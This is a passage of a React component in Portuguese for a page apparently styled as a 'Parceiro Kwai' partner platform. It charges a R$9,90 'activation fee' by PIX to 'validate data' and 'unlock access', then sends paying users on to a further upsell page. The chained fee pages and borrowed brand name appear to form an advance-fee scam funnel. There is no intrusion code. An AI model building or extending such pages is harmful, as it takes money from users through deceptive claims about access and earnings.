...
const Upsell2 = () => {
  ...
  const checkPaymentStatus = async (transactionId: string) => {
    try {
      ...
      if (data.status === "APPROVED") {
        ...
        // Redireciona para a página upsell3 após 2 segundos
        setTimeout(() => {
          navigate('/upsell3');
        }, 2000);
      }
  ...
  const handleAtivarAcesso = async () => {
      ...
      <div className="px-4 py-6 max-w-md mx-auto">
        ...
        <div className="bg-green-100 border border-green-400 rounded-lg p-3 mb-6 flex items-start space-x-2">
          ...
          <span className="text-green-800 text-sm font-medium">
            Taxa de Acesso à Plataforma - R$ 9,90
          </span>
        </div>
        ...
        <p className="text-gray-700 text-sm mb-4">
          Agora, antes de acessar a plataforma Parceiro Kwai, é necessário concluir a etapa de ativação da conta, com uma <strong>taxa única de cadastro</strong>.
        </p>

        <div className="bg-blue-50 border-l-4 border-blue-400 p-3 mb-6">
          <p className="text-blue-800 text-sm">
            Essa taxa valida seus dados no sistema e libera acesso completo à plataforma.
          </p>
        </div>

        {/* Benefícios */}
        <div className="bg-gray-100 rounded-lg p-4 mb-6">
          <h2 className="font-bold text-gray-900 mb-3">O que você ganha com a ativação:</h2>
          ...
          <div className="space-y-3">
            <div className="flex items-start space-x-3">
              ...
              <span className="text-gray-700 text-sm">Acesso ao painel de vídeos</span>
            </div>
            ...
            <div className="flex items-start space-x-3">
              ...
              <span className="text-gray-700 text-sm">Registro oficial para recebimentos</span>
            </div>
            ...
            <div className="flex items-start space-x-3">
              ...
              <span className="text-gray-700 text-sm">Ativação segura e rastreável do seu perfil</span>
            </div>
          </div>

          <div className="mt-4 flex justify-between font-bold text-lg border-t pt-3">
            <span>Taxa de ativação</span>
            <span className="text-[#FF4906]">R$9,90</span>
          </div>
        </div>

        {/* Botão Ativar */}
        <button 
          onClick={handleAtivarAcesso}
        ...
        >
          {isGeneratingPix ? (
            ...
            "Ativar Acesso e Entrar na Plataforma"
          )}
        </button>
        ...
        <div className="bg-white border border-gray-200 rounded-lg p-4 mb-6">
          <div className="flex items-center space-x-2 mb-2">
            <div className="bg-[#FF4906] rounded-full p-1">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="white">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
              </svg>
            </div>
            <h3 className="font-bold text-gray-900">Ativação segura</h3>
          </div>
          <p className="text-sm text-gray-600">
            Sua conta será ativada imediatamente após o pagamento, garantindo acesso completo à plataforma.
          </p>
        </div>
        ...
        {/* Dúvidas Frequentes */}
        <div className="mb-6">
          <h2 className="font-bold text-xl text-gray-900 mb-4">Por que preciso pagar uma taxa?</h2>
          
          <div className="space-y-3">
            <div className="border-b border-gray-200 pb-3">
              <p className="font-medium text-gray-900 text-sm">
                A taxa valida seus dados no sistema e ativa sua conta
              </p>
            </div>
            
            <div className="border-b border-gray-200 pb-3">
              <p className="font-medium text-gray-900 text-sm">
                Como funciona o registro oficial para recebimentos?
              </p>
            </div>
            
            <div className="border-b border-gray-200 pb-3">
              <p className="font-medium text-gray-900 text-sm">
                Quando terei acesso ao painel de vídeos?
              </p>
            </div>
          </div>
        </div>
        ...
        <div className="fixed inset-0 flex items-end justify-center z-50">
          <div className={`bg-white w-full max-w-md rounded-t-2xl p-6 shadow-2xl transform transition-all duration-1500 ease-out ${
            ...
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-bold text-gray-900">Ativação via PIX</h3>
              <button 
                onClick={() => {
            ...
            <div className="text-center mb-4">
              <p className="text-gray-600 text-sm">Taxa de ativação</p>
              <p className="text-2xl font-bold text-gray-900">R$ 9,90</p>
            </div>
            ...
            <div className="bg-orange-50 border border-orange-200 rounded-lg p-3 mb-4">
              <p className="text-orange-800 text-sm">
                <strong>Instruções:</strong> Escaneie o QR Code ou copie a chave PIX para realizar o pagamento de R$ 9,90. 
            ...
            {paymentStatus === "approved" && (
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
                <p className="text-green-800 text-sm font-medium">
                  Pagamento aprovado! Sua conta será ativada em instantes.
                </p>
              </div>
            )}
